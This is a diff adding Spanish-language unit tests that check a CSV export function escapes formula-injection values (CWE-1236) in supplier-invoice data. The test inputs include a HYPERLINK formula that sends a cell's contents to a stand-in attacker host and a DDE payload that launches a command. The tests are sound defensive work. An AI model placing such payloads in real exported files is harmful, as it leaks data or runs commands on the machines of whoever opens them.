@@ -151,3 +151,46 @@ describe('toCsv — lo que abre Excel', () => {
     expect(csv.split('\n')[1]).toBe('5000,4812.5');
   });
 });
+
+// ═══════════════════════════════════════════════════════════════════════════
+// AUDITORÍA ADVERSARIAL ALTO #1 — INYECCIÓN DE FÓRMULAS CSV (CWE-1236). `toCsv`
+// es el serializador compartido del export de facturas de proveedor (y de
+// otros): un texto libre que viene de un CFDI ajeno (correo NO autenticado) y
+// empieza con =, +, -, @, tab o retorno de carro se neutraliza con `'` ANTES
+// de escribirse — el patrón OWASP, el mismo que ya usan `export_configurable.ts`
+// y `liquidacion_externa/csv.ts`.
+// ═══════════════════════════════════════════════════════════════════════════
+describe('toCsv — inyección de fórmulas CSV (CWE-1236)', () => {
+  it('una celda que empieza con = sale ESCAPADA con comilla simple, no como fórmula cruda', () => {
+    const csv = toCsv([{ descripcion: '=HYPERLINK("http://evil.example/?x="&A1,"clic aquí")', total: 100 }]);
+    const fila = csv.trimEnd().split('\n')[1];
+    // La celda nunca puede quedar empezando con "=" sin la comilla protectora.
+    expect(fila.startsWith('=')).toBe(false);
+    expect(fila).toContain("'=HYPERLINK");
+  });
+
+  it('+, -, @, tabulador y retorno de carro al inicio también se neutralizan', () => {
+    for (const payload of ['+1+1', '-2+3', '@SUM(A1:A9)', '\tcmd', '\rcmd']) {
+      const csv = toCsv([{ nota: payload }]);
+      const celda = csv.trimEnd().split('\n')[1];
+      expect(celda.startsWith("'")).toBe(true);
+    }
+  });
+
+  it('un NÚMERO negativo legítimo (nota de crédito) NO se toca — sigue siendo número, no texto protegido', () => {
+    const csv = toCsv([{ total: -350 }]);
+    expect(csv.trimEnd().split('\n')[1]).toBe('-350');
+  });
+
+  it('un texto que casualmente dice "-350" (no un number) SÍ se protege: no se confía en el contenido, en el tipo', () => {
+    const csv = toCsv([{ nota: '-350' }]);
+    expect(csv.trimEnd().split('\n')[1]).toBe("'-350");
+  });
+
+  it('el RFC del emisor/receptor de un CFDI ajeno con formato de fórmula también sale protegido', () => {
+    const csv = toCsv([{ rfc_emisor: '=cmd|\'/c calc\'!A1', rfc_receptor: 'AAA010101AAA' }]);
+    const [, fila] = csv.trimEnd().split('\n');
+    const [emisor] = fila.split(',');
+    expect(emisor.startsWith('=')).toBe(false);
+  });
+});
